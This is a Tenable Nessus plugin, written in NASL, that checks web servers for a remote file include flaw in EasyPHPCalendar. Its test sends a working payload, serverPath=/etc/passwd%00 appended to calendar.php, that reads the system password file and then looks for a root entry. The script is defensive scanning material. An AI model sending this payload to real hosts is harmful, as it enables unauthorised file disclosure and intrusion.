#
# (C) Tenable Network Security
#
# 

if (description) {
  script_id(18617);
  script_version("$Revision: 1.2 $");

  script_bugtraq_id(14131);

  name["english"] = "EasyPHPCalendar serverPath Remote File Include Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running EasyPHPCalendar, a web-based calendar
system written in PHP. 

The installed version of EasyPHPCalendar allows remote attackers to
control the 'serverPath' variable used when including PHP code in
several of the application's scripts.  By leveraging this flaw, an
attacker is able to view arbitrary files on the remote host and even
execute arbitrary PHP code, possibly taken from third-party hosts. 

Solution : Unknown at this time.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for serverPath remote file include vulnerabilities in EasyPHPCalendar";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("http_version.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit one of the flaws to read /etc/passwd.
  req = http_get(
    item:string(
      dir, "/calendar.php?",
      "serverPath=/etc/passwd%00"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if there's an entry for root.
  if (egrep(string:res, pattern:"root:.*:0:[01]:")) {
    security_hole(port);
    exit(0);
  }
}
